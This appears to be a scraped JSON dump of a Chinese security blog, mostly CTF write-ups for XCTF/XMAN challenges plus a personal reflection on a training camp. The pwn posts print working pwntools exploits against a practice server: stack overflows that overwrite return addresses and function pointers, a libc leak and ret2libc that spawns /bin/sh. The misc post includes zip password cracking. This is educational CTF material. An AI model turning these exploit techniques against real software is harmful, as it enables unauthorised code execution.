exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level='debug'# p = process('./stack2')p = remote('111.198.29.45',45441)# gdb.attach(p,\"b*0x080488EE\")def set_addr(): # 0x080485B4 call _system p.sendline('3') p.sendafter('which number to change:','132\\n') p.sendafter('new number:','180\\n') p.sendline('3') p.sendafter('which number to change:', '133\\n') p.sendafter('new number:', '133\\n') p.sendline('3') p.sendafter('which number to change:', '134\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '135\\n') p.sendafter('new number:', '8\\n') # 0x08048987 '/bin/sh'[7] p.sendline('3') p.sendafter('which number to change:', '136\\n') p.sendafter('new number:', '135\\n') p.sendline('3') p.sendafter('which number to change:', '137\\n') p.sendafter('new number:', '137\\n') p.sendline('3') p.sendafter('which number to change:', '138\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '139\\n') p.sendafter('new number:', '8\\n') p.sendline('5')pause()p.sendafter('How many numbers you have:','4\\n')p.sendafter('Give me your numbers','1 2 3 4\\n')set_addr()p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"warmup","date":"2019-08-20T15:07:30.000Z","path":"2019/08/20/warmup/","text":"溢出点:scanf输入字符串的时候没有检查长度 123char v2[32]; // [esp+10h] [ebp-74h]//...__isoc99_scanf(\"%s\", v2); 逻辑分析: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546for ( i = 0; ; ++i ) &#123; v0 = i; if ( v0 &gt;= strlen(v2) ) break; switch ( v14 ) &#123; case 1: if ( sub_8048702(v2[i]) ) v14 = 2; break; case 2: if ( v2[i] == '@' ) v14 = 3; break; case 3: if ( check2(v2[i]) ) v14 = 4; break; case 4: if ( v2[i] == '.' ) v14 = 5; break; case 5: if ( check3(v2[i]) ) v14 = 6; break; case 6: if ( check3(v2[i]) ) v14 = 7; break; case 7: if ( check3(v2[i]) ) v14 = 8; break; case 8: if ( check3(v2[i]) ) v14 = 9; break; case 9: v14 = 10; break; default: continue; &#125; &#125; 这一大段其实就是依次检查我们输入的字符串的每一位并将v14置成对应的数，但其实这一段并没什么用 关键是这一段 1(*(&amp;v3 + --v14))(); v3加上v14减去1，将这个地址开始的指令当作函数来执行。v14初始值为1，我们简单点上面的检查都不通过，那么到这一步，地址就只取决于v3 123456789101112size_t v0; // ebx char v2[32]; // [esp+10h] [ebp-74h] int (*v3)(); // [esp+30h] [ebp-54h] int (*v4)(); // [esp+34h] [ebp-50h] int (*v5)(); // [esp+38h] [ebp-4Ch] int (*v6)(); // [esp+3Ch] [ebp-48h] int (*v7)(); // [esp+40h] [ebp-44h] int (*v8)(); // [esp+44h] [ebp-40h] int (*v9)(); // [esp+48h] [ebp-3Ch] int (*v10)(); // [esp+4Ch] [ebp-38h] int (*v11)(); // [esp+50h] [ebp-34h] int (*v12)(); // [esp+54h] [ebp-30h] 观察到v3的位置是在相对v2高地址的地方，我们可以通过v2的输入来覆盖v3的值 exp:123456789101112from pwn import *context.log_level='debug'# p = process('./forgot')p=remote('111.198.29.45',42514)p.recvuntil('&gt; ')p.sendline('faint-star')payload = 0x20*'A'+p32(0x080486CC)p.recvuntil('&gt; ')p.sendline(payload)p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"dice-game","date":"2019-08-20T14:11:56.000Z","path":"2019/08/20/dice-game/","text":"溢出点:123char buf[55]; // [rsp+0h] [rbp-50h]//...v6 = read(0, buf, 0x50uLL); 读进来的数据刚好能覆盖到rbp指针之前，无法覆盖返回地址。 分析:程序会不停的产生随机数，猜中50次就能得到flag。当然随机是伪随机，当seed一定时产生的数列是一定的，这个seed也是存放在栈上，溢出点虽然无法利用来覆盖返回地址，但是可以覆盖栈上的local variable。 产生随机数:产生一个长度为50的seed为0的伪随机序列: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123; unsigned int seed[2]=&#123;0,0&#125;; srand(seed[0]); for (int i = 0; i &lt;= 49; ++i )&#123; int r = rand() % 6 + 1; printf(\"%d \",r); &#125;&#125; exp:123456789101112131415161718from pwn import *context.log_level='debug'# p=process('./dice_game')p=remote('111.198.29.45',35516)index=0num = '2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'.split()payload = 0x40*'a'+p64(0)p.recvuntil('Welcome, let me know your name: ')p.sendline(payload)for i in range(0,50): p.recvuntil('Give me the point(1~6): ') p.sendline(num[index]) index=index+1p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"level3","date":"2019-08-15T14:34:34.000Z","path":"2019/08/15/XCTF-PWN/","text":"level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, \"Input:\\n\", 7u); return read(0, &amp;buf, 256u);&#125; exp: 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *context.log_level='debug'# payload = cyclic(0x100)io = process('./level3')io = remote('111.198.29.45',45330)elf = ELF('./level3')write_plt = elf.plt['write']write_got = elf.got['write']main_addr = 0x08048484# gdb.attach(io)payload1 = 0x8c*'a'+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil('Input:\\n')# pause()io.sendline(payload1)write = u32(io.recv(4))info('write:'+hex(write))obj = LibcSearcher(\"write\", write)system = write + obj.dump(\"system\") - obj.dump(\"write\") #system offsetbin_sh = write + obj.dump(\"str_bin_sh\") - obj.dump(\"write\") #/bin/sh offsetinfo('system:'+hex(system))info('/bin/sh:'+hex(bin_sh))payload2 = 0x8c*'b'+p32(system)+p32(main_addr)+p32(bin_sh)io.recvuntil('Input:\\n')# pause()io.sendline(payload2)io.interactive() 调试技巧: 在read处按下Tab键找到地址 断点下在 0x08048482 处 12.text:08048482 leave.text:08048483 retn python里加上调试语句，python脚本运行时会自动打开gdb进行调试。 1# gdb.attach(io) 但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让12345```pythonio.recvuntil(&apos;Input:\\n&apos;)# pause()io.sendline(payload1) 123io.recvuntil('Input:\\n')# pause()io.sendline(payload2) 在填充至返回地址的时候，可以用gdb跟踪到ret指令处，此时查看$esp寄存器的内容，可以检查自己的地址是否填正确。","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"}]},{"title":"xman-misc","date":"2019-08-12T10:14:10.000Z","path":"2019/08/12/xman-misc/","text":"cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。 ceph1 追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面 ceph2 linux下使用tcpxtract分离，其中一张图片即为flag 1tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap Erik-Baleog-and-Olaf压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同 1compare hint.png stego100.png -compose src diff.png hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可 Miscellaneous-300一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压 12345678910111213import os,sys,zipfileoriginal_file='12475.zip'while True: original_file = zipfile.ZipFile(original_file) if 'zip' in original_file.namelist()[0]: inner_zipfile = original_file.namelist()[0] original_file_password = inner_zipfile[:inner_zipfile.find('.')] original_file.setpassword(original_file_password) original_file.extractall() os.remove(original_file.filename) original_file = inner_zipfile else: break 到最后一层12475.zip无法解压了，这个时候进行爆破 1fcrackzip -u -l 1-6 -c 'a1' 12475.zip -u：使用unzip解压 -l：后面接长度范围 -c：后接字符，a为所有小写字母，1是数字[0-9] 小小的PDF打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容 1foremost -i 2333.pdf -o test foremost是基于文件头及尾部信息恢复文件的工具。 Refference https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/ https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300","tags":[{"name":"xctf","slug":"xctf","permalink":"http://yoursite.com/tags/xctf/"},{"name":"misc","slug":"misc","permalink":"http://yoursite.com/tags/misc/"}]},{"title":"XMAN-2019-福州营","date":"2019-08-11T09:55:59.000Z","path":"2019/08/11/xman/","text":"该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。","tags":[]}]